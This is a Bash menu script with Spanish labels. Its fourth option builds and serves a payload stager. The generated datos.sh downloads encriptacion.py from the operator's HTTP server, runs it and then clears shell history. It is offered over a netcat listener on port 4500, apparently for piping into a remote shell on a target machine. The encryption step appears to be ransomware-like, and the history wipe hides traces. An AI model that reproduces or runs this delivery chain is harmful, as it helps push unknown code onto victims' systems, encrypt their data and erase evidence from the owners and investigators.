#!/bin/bash

while true; do
    clear
    echo "========================"
    echo "        MENÚ            "
    echo "========================"
    echo "1. Ejecutar Script 1"
    echo "2. Ejecutar Script 2"
    echo "3. Ejecutar Script 3"
    echo "4. Ejecutar Script Encriptar"
    echo "5. Salir"
    echo "========================"
    read -p "Seleccione una opción [1-5]: " opcion

    case $opcion in
        1)
            ./script1.sh
            ;;
        2)
            ./script2.sh
            ;;
        3)
            ./script3.sh
            ;;
        4)
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
            
            # Crear el script datos.sh
            cat <<EOF > datos.sh
#!/bin/bash
wget http://$var:8000/py/encriptacion.py
sleep 3
python3 encriptacion.py
history -c
EOF
            # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que se inicie el servidor HTTP
            sleep 1
            # Enviar el script remoto a través de nc
            cat datos.sh | nc -lvp 4500
            ;;
        5)
            echo "Saliendo..."
            break
            ;;
        *)
            echo "Opción no válida. Intente de nuevo."
            ;;
    esac
    read -p "Presione enter para continuar..."
done
